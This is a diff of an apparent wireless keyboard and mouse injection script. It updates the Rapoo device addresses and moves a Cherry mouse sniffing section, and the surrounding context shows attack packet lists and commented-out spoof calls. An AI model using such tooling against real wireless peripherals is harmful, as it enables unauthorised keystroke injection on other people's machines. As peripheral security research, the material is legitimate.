@@ -101,8 +101,8 @@ attack_tx_mouse = tx_mouse.build_packet([MouseClickType.LEFT_CLICK], x_move="888
 ----------------------------Rapoo----------------------------
 """
 
-rapoo_keyboard = Rapoo_Keyboard("c7:92:78:79", 0x11021, 0xefdf)
-rapoo_mouse = Rapoo_Mouse("c7:92:78:79", 0x11021, 0xefdf)
+rapoo_keyboard = Rapoo_Keyboard("c7:92:78:79:dc:69:06", 0x11021, 0xefdf)
+rapoo_mouse = Rapoo_Mouse("c7:92:78:79:dc:69:04", 0x11021, 0xefdf)
 
 attack_rapoo_keyboard = [
     rapoo_keyboard.build_packet([KeyboardScancode.KEY_LGUI]),
@@ -156,15 +156,6 @@ attack_edenwood_mouse = [
 
 
 """
-----------------------------Edenwood----------------------------
-"""
-
-cherry_mouse = Cherry_Mouse("ac:da:da:96", 0x11021, 0x3c32)
-#cherry_mouse.sniff()
-
-
-
-"""
 ----------------------------Qware----------------------------
 """
 
@@ -189,3 +180,13 @@ attack_qware_mouse = [qware_mouse.build_packet([MouseClickType.LEFT_CLICK], x_mo
 
 #qware_keyboard.spoof(attack_qware_keyboard)
 #qware_mouse.spoof(attack_qware_mouse)
+
+
+"""
+----------------------------Cherry----------------------------
+"""
+
+cherry_mouse = Cherry_Mouse("ac:da:da:96", 0x11021, 0x3c32)
+#cherry_mouse.sniff()
+
+
